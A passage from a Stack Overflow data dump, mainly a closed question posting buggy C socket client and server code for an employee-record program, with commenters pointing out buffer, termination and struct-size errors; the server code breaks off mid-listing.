href=\"https://i.stack.imgur.com/dotj0.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/dotj0.png\" alt=\"enter image description here\"></a></p>\n\n<p>This is the result drawing out of the following mysterious code that evidently draws everything pixel by pixel on a canvas area:</p>\n\n<pre><code>int w, h;\n\nfor(w = 0; w &lt; width; w++)\n{\n    for(h = height-1; h &gt;= 0; h--)\n    {\n        setpen(w, h, distance(w, h, 255, 255), 0.0F, 1U); // r g b(distance wh : 255) transp pensize\n        putpixel(w, h);\n    }\n}\n</code></pre>\n\n<hr>\n\n<p>How come such a short code can result in such an interesting image?\nDoes it have a name? Purposes? What does it present at all?</p>\n"}, {"tags": ["c", "linux", "sockets", "struct", "client-server"], "comments": [{"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 1, "creation_date": 1437590990, "post_id": 31571159, "comment_id": 51097973, "body": "[sigh] printf(&quot;Echoed data from the following server: %s\\n&quot;, buffer);&#39; assumes a null-terminated string when that is not guaranteed."}, {"owner": {"reputation": 12398, "user_id": 1310566, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/5qiMO.jpg?s=128&g=1", "display_name": "Simon Forsberg", "link": "https://stackoverflow.com/users/1310566/simon-forsberg"}, "edited": false, "score": 1, "creation_date": 1437596509, "post_id": 31571159, "comment_id": 51101334, "body": "This question was cross-posted on Code Review and then closed there for being non-working code: <a href=\"http://codereview.stackexchange.com/questions/97728/hey-comment-on-code-c-linux-and-networking-experts\" title=\"hey comment on code c linux and networking experts\">codereview.stackexchange.com/questions/97728/&hellip;</a>"}, {"owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1437597271, "post_id": 31571159, "comment_id": 51101835, "body": "@EugeneSh. OP kind of asked both: code review <i>and</i> on some part that&#39;s not working. But it&#39;s very poorly formatted/asked and am not surprised it&#39;s closed there (and will be soon here). His latest comment &quot;Please comment on code and give pseudo code for corrections&quot; suggests he still wants code review. But I never claimed I am flawless or never made a mistake :)"}, {"owner": {"reputation": 881859, "user_id": 100297, "user_type": "moderator", "profile_image": "https://www.gravatar.com/avatar/24780fb6df85a943c7aea0402c843737?s=128&d=identicon&r=PG", "display_name": "Martijn Pieters", "link": "https://stackoverflow.com/users/100297/martijn-pieters"}, "reply_to_user": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "edited": false, "score": 1, "creation_date": 1437597448, "post_id": 31571159, "comment_id": 51101938, "body": "@BlueMoon: Then you get the same: If this question is off-topic here, then vote to close it for <i>proper, listed reasons</i>. You can <i>advise</i> that a question might be a good CR fit, but the first rule of voting to close a post is that it has to <i>actually be off-topic here</i>. For example, this question might be <i>too broad</i>. At which point you vote to close it as such, advise the OP that it <i>might</i> be a better fit for CR (check their on-topic help info first) and flag the post to ask a moderator to migrate it. But don&#39;t abuse the custom close vote messages for this."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 881859, "user_id": 100297, "user_type": "moderator", "profile_image": "https://www.gravatar.com/avatar/24780fb6df85a943c7aea0402c843737?s=128&d=identicon&r=PG", "display_name": "Martijn Pieters", "link": "https://stackoverflow.com/users/100297/martijn-pieters"}, "edited": false, "score": 0, "creation_date": 1437599829, "post_id": 31571159, "comment_id": 51103190, "body": "@MartijnPieters: I wonder then why there is a free-comment field for close votes. It would be greatly appreciated if you would be so kind to give an example that field might be of use by the rules you just stated."}, {"owner": {"reputation": 881859, "user_id": 100297, "user_type": "moderator", "profile_image": "https://www.gravatar.com/avatar/24780fb6df85a943c7aea0402c843737?s=128&d=identicon&r=PG", "display_name": "Martijn Pieters", "link": "https://stackoverflow.com/users/100297/martijn-pieters"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1437599976, "post_id": 31571159, "comment_id": 51103281, "body": "@Olaf: Voting to close something because it is not about programming and doesn&#39;t fit the pre-defined reasons. Like asking where the nearest shoeshop is."}], "answers": [{"comments": [{"owner": {"reputation": 91, "user_id": 3145350, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/a3d8f37f5596ddff857a05f321c6aaba?s=128&d=identicon&r=PG&f=1", "display_name": "user3145350", "link": "https://stackoverflow.com/users/3145350/user3145350"}, "edited": false, "score": 0, "creation_date": 1437593671, "post_id": 31571921, "comment_id": 51099652, "body": "@user362949 thanks for pointing can give the pseudo code for the solution"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 1, "creation_date": 1437597187, "post_id": 31571921, "comment_id": 51101784, "body": "&#39;Note: the socket has not been set to &#39;non-blocking&#39; so the code will &#39;hang&#39; until 100 bytes are read or the socket times out.&#39; - no, it will not."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1437632277, "post_id": 31571921, "comment_id": 51112638, "body": "Wrong answer. The real issues are: 1) reading only the first available chunk instead of looping until the expected length is read 2) reading 100 bytes and overwriting a much bigger <code>struct</code> with it (containing whatever junk bytes there might be after the 100 read from the socket) 3) relying on structure packing instead of transmitting the members individually 4) not caring about host/network byte order --- and that&#39;s just what is applicable to these quoted lines."}], "tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": 1, "last_activity_date": 1437592054, "creation_date": 1437592054, "answer_id": 31571921, "question_id": 31571159, "link": "https://stackoverflow.com/questions/31571159/review-code-and-comment-c-linux-and-networking-experts/31571921#31571921", "title": "Review code and comment c linux and networking experts", "body": "<p>there are several logic errors in the posted code.</p>\n\n<p>Here is the details of one such error:</p>\n\n<pre><code>rc= read(sd,&amp;buffer,100);\nmemcpy(&amp;temp1,buffer,sizeof(temp1));\nprintf(\"\\nid is  = %d name is = %s\\n\",temp1.empid,temp1.name);\n\n1) read() does not append a string terminator byte\n2) memcpy() is copying the full buffer[] rather than just the number of bytes read\n3) printf...%s... does not stop printing until it encounters a '\\0' byte.\n</code></pre>\n\n<p>What happens if the number of bytes read is only a few bytes</p>\n\n<p>(this can happen, and often does, which is the reason to use a 'select()/read()' with the socket set to non-blocking, loop to assure getting all the required/desired bytes of input.)</p>\n\n<p>only copy the actual number of read bytes 'rc' to the 'temp1' struct.\nThen insert a '\\0' as the next byte.</p>\n\n<p>Note: the socket has not been set to 'non-blocking' so the code will 'hang' until 100 bytes are read or the socket times out.</p>\n"}], "owner": {"reputation": 91, "user_id": 3145350, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/a3d8f37f5596ddff857a05f321c6aaba?s=128&d=identicon&r=PG&f=1", "display_name": "user3145350", "link": "https://stackoverflow.com/users/3145350/user3145350"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 80, "favorite_count": 0, "closed_date": 1437634307, "answer_count": 1, "score": -3, "last_activity_date": 1437592054, "creation_date": 1437589622, "question_id": 31571159, "link": "https://stackoverflow.com/questions/31571159/review-code-and-comment-c-linux-and-networking-experts", "closed_reason": "Not suitable for this site", "title": "Review code and comment c linux and networking experts", "body": "<p>My problem statement was to create,update,delete,display record using client server program.\nHere is mine code for client</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n#include &lt;stdlib.h&gt;\n\n#include &lt;string.h&gt;\n\n#include &lt;sys/types.h&gt;\n\n#include &lt;sys/socket.h&gt;\n\n#include &lt;netinet/in.h&gt;\n\n#include &lt;arpa/inet.h&gt;\n\n#include &lt;netdb.h&gt;\n\n#include &lt;unistd.h&gt;\n\n#include &lt;errno.h&gt;\n\n/* BufferLength is 100 bytes */\n\n#define BufferLength 150\n\n/* Default host name of server system. Change it to your default */\n\n/* server hostname or IP.  If the user do not supply the hostname */\n\n/* as an argument, the_server_name_or_IP will be used as default*/\n\n#define SERVER \"The_server_name_or_IP\"\n\n/* Server's port number */\n\n#define SERVPORT 3111\n\n#define ID_ZERO \"ID CAN'T BE ZERO\"\n#define FILE_ERR \"CAN'T OPEN FILE\"\n#define ID_EXIST \"ID ALREADY EXIST\"\n#define DEL_OK \"Deleted Record\"\n#define CREATED_RECORD \"CREATED_RECORD\"\n#define EMP_NOT_FOUND \"EMP NOT FOUND\"\n#define UPDATED_RECORD \"UPDATED RECORD\"\n#define BufferLength 150\n\n\n/* Pass in 1 parameter which is either the */\n\n/* address or host name of the server, or */\n\n/* set the server name in the #define SERVER ... */\n#pragma pack(1)\nstruct emprec\n\n{\n\n    int empid;\n    int operation;\n    char name[200];\n\n};\n#pragma pack(0)\n\ntypedef struct emprec emp;\nchar data1[100];\nint main(int argc, char *argv[])\n\n{\n\n    /* Variable and structure definitions. */\n\n    int sd, rc, length = sizeof(int);\n\n    struct sockaddr_in serveraddr;\n\n    char buffer[BufferLength];\n\n    char server[255];\n\n    char temp;\n    int count=0;\n    int totalcnt = 0;\n    emp temp1;\n\n    struct hostent *hostp;\n\n\n    unsigned char* datas = (unsigned char*)malloc(sizeof(temp1));\n\n\n\n    /* The socket() function returns a socket */\n\n    /* descriptor representing an endpoint. */\n\n    /* The statement also identifies that the */\n\n    /* INET (Internet Protocol) address family */\n\n    /* with the TCP transport (SOCK_STREAM) */\n\n    /* will be used for this socket. */\n\n    /******************************************/\n\n    /* get a socket descriptor */\n\n    if((sd = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0)\n\n    {\n\n        perror(\"Client-socket() error\");\n\n        exit(-1);\n\n    }\n\n    else\n\n        printf(\"Client-socket() OK\\n\");\n\n    /*If the server hostname is supplied*/\n\n    if(argc &gt; 1)\n\n    {\n\n        /*Use the supplied argument*/\n\n        strcpy(server, argv[1]);\n\n        printf(\"Connecting to the following %s, port %d ...\\n\", server, SERVPORT);\n\n    }\n\n    else\n\n        /*Use the default server name or IP*/\n\n        strcpy(server, SERVER);\n\n\n\n    memset(&amp;serveraddr, 0x00, sizeof(struct sockaddr_in));\n\n    serveraddr.sin_family = AF_INET;\n\n    serveraddr.sin_port = htons(SERVPORT);\n\n\n\n    if((serveraddr.sin_addr.s_addr = inet_addr(server)) == (unsigned long)INADDR_NONE)\n\n    {\n\n\n\n        /* When passing the host name of the server as a */\n\n        /* parameter to this program, use the gethostbyname() */\n\n        /* function to retrieve the address of the host server. */\n\n        /***************************************************/\n\n        /* get host address */\n\n        hostp = gethostbyname(server);\n\n        if(hostp == (struct hostent *)NULL)\n\n        {\n\n            printf(\"HOST NOT FOUND --&gt; \");\n\n            /* h_errno is usually defined */\n\n            /* in netdb.h */\n\n            printf(\"h_errno = %d\\n\",h_errno);\n\n            printf(\"---This is a client program---\\n\");\n\n            printf(\"Command usage: %s &lt;server name or IP&gt;\\n\", argv[0]);\n\n            close(sd);\n\n            exit(-1);\n\n        }\n\n        memcpy(&amp;serveraddr.sin_addr, hostp-&gt;h_addr, sizeof(serveraddr.sin_addr));\n\n    }\n\n\n\n    /* After the socket descriptor is received, the */\n\n    /* connect() function is used to establish a */\n\n    /* connection to the server. */\n\n    /***********************************************/\n\n    /* connect() to server. */\n\n    if((rc = connect(sd, (struct sockaddr *)&amp;serveraddr, sizeof(serveraddr))) &lt; 0)\n\n    {\n\n        perror(\"Client-connect() error\");\n\n        close(sd);\n\n        exit(-1);\n\n    }\n\n    else\n\n        printf(\"Connection established...\\n\");\n\n\n\n    /* Send string to the server using */\n\n    /* the write() function. */\n\n    /*********************************************/\n\n    /* Write() some string to the server. */\n\n    while(1)\n    {\n        printf(\"Enter the choice\\n\");\n        printf(\"1- Insert a new record into file\\n\");\n        printf(\"2- Update the record\\n\");\n        printf(\"3- Display the records\\n\");\n        printf(\"4- Delete the record\\n\");\n        printf(\"5- Close the connection with the server\\n\");\n        int choice;\n        scanf(\"%d\",&amp;choice);\n\n\n        switch(choice){\n        case 1:\n\n\n\n\n            //emp temp1;\n            temp1.operation=1;\n            printf(\"Enter the id of the record\\n\");\n            scanf(\"%d\",&amp;temp1.empid);\n            if(temp1.empid==0)\n\n                {\n                printf(\"id cannot be zero\\n\");\n                break;\n                }\n            printf(\"Enter name correspond to that id\\n\");\n            scanf(\"%s\",temp1.name);\n            if(strlen(temp1.name)==0)\n                {\n                        printf(\"name cannot be empty\\n\");\n                        break;\n                }           \n\n            //printf(\"id that is being sent is %d\\n\",temp1.empid);\n            //printf(\"Name sent is %s\\n\",temp1.name);\n\n\n            memset(datas,0,sizeof(temp1));\n            memcpy(datas,&amp;temp1,sizeof(temp1));\n\n            rc =write(sd,datas,sizeof(temp1));\n\n            if(rc &lt; 0)\n\n            {\n\n                perror(\"Client-write() error\");\n\n                rc = getsockopt(sd, SOL_SOCKET, SO_ERROR, &amp;temp, &amp;length);\n\n                if(rc == 0)\n\n                {\n\n                    //Print out the asynchronously received error. \n\n                    errno = temp;\n\n                    perror(\"SO_ERROR was\");\n\n                }\n\n                close(sd);\n\n                exit(-1);\n\n            }\n\n            else\n\n            {\n\n                printf(\"Client-write() is OK\\n\");\n\n                printf(\"String successfully sent!\\n\");\n\n                printf(\"Waiting the %s to echo back...\\n\", server);\n\n            }\n            //  }//else loop\n\n\n            totalcnt = 0;\n\n            //  while(totalcnt &lt; BufferLength)\n\n            //  {\n\n\n\n            /* Wait for the server to echo the */\n\n            /* string by using the read() function. */\n\n            /***************************************/\n\n            /* Read data from the server. */\n\n\n            rc = read(sd, &amp;buffer, 100);\n\n\n            if(rc &lt; 0)\n\n            {\n\n                perror(\"Client-read() error\");\n\n                close(sd);\n\n                exit(-1);\n\n            }\n\n            else if (rc == 0)\n\n            {\n\n                printf(\"Server program has issued a close()\\n\");\n\n                close(sd);\n\n                exit(-1);\n\n            }\n\n            else\n\n                totalcnt += rc;\n\n            // }\n\n            printf(\"Client-read() is OK\\n\");\n\n            printf(\"Echoed data from the following server: %s\\n\", buffer);\n            if(strcmp(buffer,CREATED_RECORD)==0){\n            count++;\n            printf(\"count incremented\\n\");\n            }\n            break;\n\n            //}//while loop\n        case 2:  //Update the record\n            {\n                //emp temp21;\n                temp1.operation=2;\n                printf(\"Enter the id for which the record is to update \\n\");\n                scanf(\"%d\",&amp;temp1.empid);\n                printf(\"Enter name correspond to that id\\n\");\n                scanf(\"%s\",temp1.name);\n                printf(\"id that is being sent t update is %d\\n\",temp1.empid);\n                memset(datas,0,sizeof(temp1));\n                memcpy(datas,&amp;temp1,sizeof(temp1));\n\n                rc =write(sd,datas,sizeof(temp1));\n                if(rc &lt; 0)\n\n                {\n\n                    perror(\"Client-write() error\");\n\n                    rc = getsockopt(sd, SOL_SOCKET, SO_ERROR, &amp;temp, &amp;length);\n\n                    if(rc == 0)\n\n                    {\n\n                        //Print out the asynchronously received error. \n\n                        errno = temp;\n\n                        perror(\"SO_ERROR was\");\n\n                    }\n\n                    close(sd);\n\n                    exit(-1);\n\n                }\n\n                else\n\n                {\n\n                    printf(\"Client-write() is OK\\n\");\n\n                    printf(\"String successfully sent!\\n\");\n\n                    printf(\"Waiting the %s to echo back...\\n\", server);\n\n                }\n                //  }//else loop\n\n\n                totalcnt = 0;\n\n                //while(totalcnt &lt; BufferLength)\n\n                //{\n\n\n\n                    /* Wait for the server to echo the */\n\n                    /* string by using the read() function. */\n\n                    /***************************************/\n\n                    /* Read data from the server. */\n\n                    rc = read(sd, &amp;buffer, 25);\n\n                    if(rc &lt; 0)\n\n                    {\n\n                        perror(\"Client-read() error\");\n\n                        close(sd);\n\n                        exit(-1);\n\n                    }\n\n                    else if (rc == 0)\n\n                    {\n\n                        printf(\"Server program has issued a close()\\n\");\n\n                        close(sd);\n\n                        exit(-1);\n\n                    }\n\n                    else\n\n                        totalcnt += rc;\n\n                //}\n\n                printf(\"Client-read() is OK\\n\");\n\n                printf(\"Echoed data from the following server: %s\\n\", buffer);\n\n                break;\n\n        case 3: //display\n            {\n                //emp temp31;\n                printf(\"IN DISPLAY\\n\");\n                printf(\"value of count is %d\\n\",count);\n                temp1.operation=3;\n\n                memset(datas,0,sizeof(temp1));\n                memcpy(datas,&amp;temp1,sizeof(temp1));\n\n                rc =write(sd,datas,sizeof(temp1));\n\n\n\n\n                if(rc &lt; 0)\n\n                {\n\n                    perror(\"Client-write() error\");\n                    rc = getsockopt(sd, SOL_SOCKET, SO_ERROR, &amp;temp, &amp;length);\n\n                    if(rc == 0)\n\n                    {\n\n                        //Print out the asynchronously received error. \n\n                        errno = temp;\n\n                        perror(\"SO_ERROR was\");\n\n                    }\n\n                    close(sd);\n\n                    exit(-1);\n\n                }\n\n                else\n\n                {\n\n                    printf(\"Client-write() is OK\\n\");\n\n                    printf(\"String successfully sent!\\n\");\n\n                //  printf(\"Waiting the %s to echo back...\\n\", server);\n\n                }\n                //emp temmp;\n                int ii =1;\n                while(ii&lt;=count){\n                printf(\"value of count is %d\\n\",count);\n                rc= read(sd,&amp;buffer,100);\n                memcpy(&amp;temp1,buffer,sizeof(temp1));\n                printf(\"\\nid is  = %d name is = %s\\n\",temp1.empid,temp1.name);\n\n                ii++;\n                printf(\"value of ii is %d\\n\",ii);\n                }\n                printf(\"display loop ended\\n\");\n                //ii=0;\n                /*if(rc &lt; 0)\n\n                {\n\n                    perror(\"Server-read() error\");\n\n                    close(sd);\n\n\n\n                    exit (-1);\n\n                }\n\n                else if(rc == 0)\n\n                {\n\n                    printf(\"Client program has issued a close()\\n\");\n\n                    close(sd);\n\n                    exit(-1);\n\n                }\n\n                else \n\n                {\n\n                    totalcnt += rc;\n\n                    printf(\"Server-read() is OK\\n\");\n\n                }*/\n                //}\n                break;\n            }\n                break;\n\n        case 4:\n            {\n\n                emp temp41;\n                temp1.operation=4;\n                printf(\"Enter id to be deleted \\n\");\n\n                scanf(\"%d\",&amp;temp1.empid);\n                printf(\"enter to be deleted is %d\\n\",temp1.empid);\n\n                memset(datas,0,sizeof(temp1));\n                memcpy(datas,&amp;temp1,sizeof(temp1));\n                //sleep(10);\n                printf(\"sending\\n\");\n                rc =write(sd,datas,sizeof(temp1));\n\n                printf(\"sent\\n\");\n\n\n\n\n                if(rc &lt; 0)\n\n                {\n\n                    perror(\"Client-write() error\");\n\n                    rc = getsockopt(sd, SOL_SOCKET, SO_ERROR, &amp;temp, &amp;length);\n\n                    if(rc == 0)\n\n                    {\n\n                        //Print out the asynchronously received error. \n\n                        errno = temp;\n\n                        perror(\"SO_ERROR was\");\n\n                    }\n\n                    close(sd);\n\n                    exit(-1);\n\n                }\n\n                else\n\n                {\n\n                    printf(\"Client-write() is OK\\n\");\n\n                    printf(\"String successfully sent!\\n\");\n\n                    printf(\"Waiting the %s to echo back...\\n\", server);\n                    count--;\n\n                }\n                rc= read(sd,&amp;buffer,100);\n//FILE_ERR\n                printf(\"Message from server is %s\\n\",buffer);\n                if(strcmp(buffer,FILE_ERR)==0){\n                printf(\"Server cant open the file.... please check at the server end\\n\");\n                close(sd);\n\n                exit(0);\n            //count++;\n            //printf(\"count incremented\\n\");\n            }\n            //  if(\n                break;\n            }\n        case 5: // Shutdown case\n            {\n                //emp temp51;\n                temp1.operation=5;\n\n                memset(datas,0,sizeof(temp1));\n                memcpy(datas,&amp;temp1,sizeof(temp1));\n                //sleep(10);\n                printf(\"Closing client and asked server too to close\\n\");\n                rc =write(sd,datas,sizeof(temp1));\n\n                if(rc &lt; 0)\n\n                {\n\n                    perror(\"Client-write() error\");\n\n                    rc = getsockopt(sd, SOL_SOCKET, SO_ERROR, &amp;temp, &amp;length);\n\n                    if(rc == 0)\n\n                    {\n\n                        //Print out the asynchronously received error. \n\n                        errno = temp;\n\n                        perror(\"SO_ERROR was\");\n\n                    }\n\n                    close(sd);\n\n                    exit(-1);\n\n                }\n\n                else\n\n                {\n\n                    //printf(\"Client-write() is OK\\n\");\n\n                    //printf(\"String successfully sent!\\n\");\n\n                    //printf(\"Waiting the %s to echo back...\\n\", server);\n\n                }\n                close(sd);\n\n                exit(0);\n                break;\n\n            }\n\n\n\n            }//switch bracket\n\n\n\n\n        }//switch\n    }//while 1\n}//main\n</code></pre>\n\n<p>Here is mine code for server</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n#include &lt;stdlib.h&gt;\n\n#include &lt;string.h&gt;\n\n#include &lt;sys/time.h&gt;\n\n#include &lt;sys/types.h&gt;\n\n#include &lt;sys/socket.h&gt;\n\n#include &lt;netinet/in.h&gt;\n\n#include &lt;errno.h&gt;\n\n#include &lt;unistd.h&gt;\n\n/* BufferLength is 100 bytes */\n\n\n\n/* Server port number */\n\n//ALL CONSTANTS\n\n#define SERVPORT 3111\n#define ID_ZERO \"ID CAN'T BE ZERO\"\n#define FILE_ERR \"CAN'T OPEN FILE\"\n#define ID_EXIST \"ID ALREADY EXIST\"\n#define DEL_OK \"Deleted Record\"\n#define CREATED_RECORD \"CREATED_RECORD\"\n#define EMP_NOT_FOUND \"EMP NOT FOUND\"\n#define UPDATED_RECORD \"UPDATED RECORD\"\n#define BufferLength 150\n\n\n#pragma pack(1)\nstruct emprec\n\n{\n\n    int empid;\n    int operation;\n    char name[20];\n\n};\n#pragma pack(0)\n\ntypedef struct emprec emp;\nint main()\n\n{\n\n    /* Variable and structure definitions. */\n\n    int sd, sd2, rc, length = sizeof(int);\n\n    int totalcnt = 0, on = 1,count=0;\n    int i=1;//use only one int\n    int flag1=0;//use only one flag\n    char temp;\n\n    char buffer[BufferLength];\n    char sbuf[25];\n\n    struct sockaddr_in serveraddr;\n\n    struct sockaddr_in their_addr;\n\n    FILE *fd=NULL,*fd1=NULL;\n\n    fd_set read_fd;\n    emp temp2,temp8,temp3;\n\nunsigned char* sdata = (unsigned char*)malloc(sizeof(temp2));\n\n\n\n\n    /* The socket() function returns a socket descriptor */\n\n    /* representing an endpoint. The statement also */\n\n    /* identifies that the INET (Internet Protocol) */\n\n    /* address family with the TCP transport (SOCK_STREAM) */\n\n    /* will be used for this socket. */\n\n    /************************************************/\n\n    /* Get a socket descriptor */\n\n    if((sd = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0)\n\n    {\n\n        perror(\"Server-socket() error\");\n\n        /* Just exit */\n\n        exit (-1);\n\n    }\n\n    else\n\n        printf(\"Server-socket() is OK\\n\");\n\n\n\n    /* The setsockopt() function is used to allow */\n\n    /* the local address to be reused when the server */\n\n    /* is restarted before the required wait time */\n\n    /* expires. */\n\n    /***********************************************/\n\n    /* Allow socket descriptor to be reusable */\n\n    if((rc = setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&amp;on, sizeof(on))) &lt; 0)\n\n    {\n\n        perror(\"Server-setsockopt() error\");\n\n        close(sd);\n\n        exit (-1);\n\n    }\n\n    else\n\n        printf(\"Server-setsockopt() is OK\\n\");\n\n\n\n    /* bind to an address */\n\n    memset(&amp;serveraddr, 0x00, sizeof(struct sockaddr_in));\n\n    serveraddr.sin_family = AF_INET;\n\n    serveraddr.sin_port = htons(SERVPORT);\n\n    serveraddr.sin_addr.s_addr = htonl(INADDR_ANY);\n\n\n\n\n    /* connect to any client that used port 3005. */\n\n    if((rc = bind(sd, (struct sockaddr *)&amp;serveraddr, sizeof(serveraddr))) &lt; 0)\n\n    {\n\n        perror(\"Server-bind() error\");\n\n        /* Close the socket descriptor */\n\n        close(sd);\n\n        /* and just exit */\n\n        exit(-1);\n\n    }\n\n    else\n\n        printf(\"Server-bind() is OK\\n\");\n\n\n\n    /* The listen() function allows the server to accept */\n\n    /* incoming client connections. In this example, */\n\n    /* the backlog is set to 10. This means that the */\n\n    /* system can queue up to 10 connection requests before */\n\n    /* the system starts rejecting incoming requests.*/\n\n    /*************************************************/\n\n    /* Up to 10 clients can be queued */\n\n    if((rc = listen(sd, 10)) &lt; 0)\n\n    {\n\n        perror(\"Server-listen() error\");\n\n        close(sd);\n\n        exit (-1);\n\n    }\n\n    else\n\n        printf(\"Server-Ready for client connection...\\n\");\n\n\n\n    /* The server will accept a connection request */\n\n    /* with this accept() function, provided the */\n\n    /* connection request does the following: */\n\n    /* - Is part of the same address family */\n\n    /* - Uses streams sockets (TCP) */\n\n    /* - Attempts to connect to the specified port */\n\n    /***********************************************/\n\n    /* accept() the incoming connection request. */\n\n    int sin_size = sizeof(struct sockaddr_in);\n\n    if((sd2 = accept(sd, (struct sockaddr *)&amp;their_addr, &amp;sin_size)) &lt; 0)\n\n    {\n\n        perror(\"Server-accept() error\");\n\n        close(sd);\n\n        exit (-1);\n\n    }\n\n    else\n\n        printf(\"Server-accept() is OK\\n\");\n\n\n\n    /*client IP*/\n\n    printf(\"Server-new socket, sd2 is OK...\\n\");\n\n    //printf(\"Got connection from the f***ing client: %s\\n\", inet_ntoa(their_addr.sin_addr));\n\n    while(1){\n\n        /* The select() function allows the process to */\n\n        /* wait for an event to occur and to wake up */\n\n        /* the process when the event occurs. In this */\n\n        /* example, the system notifies the process */\n\n        /* only when data is available to read. */\n\n        /***********************************************/\n\n        /* Wait for up to 15 seconds on */\n\n        /* select() for data to be read. */\n\n        //FD_ZERO(&amp;read_fd);\n\n        //FD_SET(sd2, &amp;read_fd);\n\n        //rc = select(sd2+1, &amp;read_fd, NULL, NULL, &amp;timeout);\n\n        //if((rc == 1) &amp;&amp; (FD_ISSET(sd2, &amp;read_fd)))\n\n        //{\n\n        /* Read data from the client. */\n\n        totalcnt = 0;\n\n\n\n        //while(totalcnt &lt; BufferLength)\n\n        //{\n\n        /* When select() indicates that there is data */\n\n        /* available, use the read() function to read */\n\n        /* 100 bytes of the string that the */\n\n        /* client sent. */\n\n        /***********************************************/\n\n        /* read() from client */\n        rc= read(sd2,&amp;buffer,100);\n\n\n        if(rc &lt; 0)\n\n        {\n\n            perror(\"Server-read() error\");\n\n            close(sd);\n\n            close(sd2);\n\n            exit (-1);\n\n        }\n\n        else if (rc == 0)\n\n        {\n\n            printf(\"Client program has issued a close()\\n\");\n\n            close(sd);\n\n            close(sd2);\n\n            exit(-1);\n\n        }\n\n        else \n\n        {\n\n            totalcnt += rc;\n\n            printf(\"Server-read() is OK\\n\");\n\n        }\n\n\n\n\n\n\n\n        memcpy(&amp;temp2,buffer,sizeof(temp2));\n        printf(\"operation is %d\\n\",temp2.operation);\n\n         // declare it upwards\n        if (temp2.operation==1)//write record\n        {\n            printf(\"in write record\\n\");    \n            printf(\"id is %d\\n\",temp2.empid);\n            printf(\"name is %s\\n\",temp2.name);      \n            fd = fopen(\"/home/abc/Desktop/test34.txt\",\"a+\");\n\n\n\n            while(i&lt;=count)\n                    {\n                        printf(\"value of i is %d and count is %d\\n\",i,count);\n                        fread(&amp;temp3.empid,sizeof(temp3.empid),1,fd);\n                        fread(&amp;temp3.name,sizeof(temp3.name),1,fd);\n\n                        if(temp2.empid==temp8.empid)\n                        {\n                            printf(\"in create:: going in id checking loop\\n\");\n\n                            flag1=1;\n                            temp8.empid=0;\n                            i=0;\n                            break;\n                        }\n                        i++;\n\n                    }\n            if (flag1==1)\n                    {\n                        memset(sbuf,0,sizeof(sbuf));\n                        strcpy(sbuf,ID_EXIST);\n\n                        printf(\"temp2.empname is %s\\n\",temp2.name);\n                        rc = write(sd2, sbuf, sizeof(sbuf));\n                        i=0;\n                        flag1=0;\n                        //break;\n                    }\n            else \n                    {       \n\n\n            count++;\n            fwrite(&amp;temp2.empid,sizeof(temp2.empid),1,fd);\n            fwrite(&amp;temp2.name,20,1,fd);\n            fclose(fd);\n            sleep(1);\n            memset(sbuf,0,sizeof(sbuf));\n            strcpy(sbuf,CREATED_RECORD);\n\n\n            printf(\"Server-Echoing back to client...\\n\");\n            rc = write(sd2, sbuf, sizeof(sbuf));\n\n            if(rc &lt;0)\n\n            {\n\n                perror(\"Server-write() error\");\n\n                /* Get the error number. */\n\n                rc = getsockopt(sd2, SOL_SOCKET, SO_ERROR, &amp;temp, &amp;length);\n\n                if(rc == 0)\n\n                {\n\n                    /* Print out the asynchronously */\n\n                    /* received error. */\n\n                    errno = temp;\n\n                    perror(\"SO_ERROR was: \");\n\n                }\n\n                else\n\n                    printf(\"Server-write() is OK\\n\");\n\n\n            }\n}//else bracket\n        }\n\n                if (temp2.operation==2)//update\n                {\n                    memcpy(&amp;temp2,buffer,sizeof(temp2));\n                    printf(\"in case update\\n\");\n                    printf(\"id is 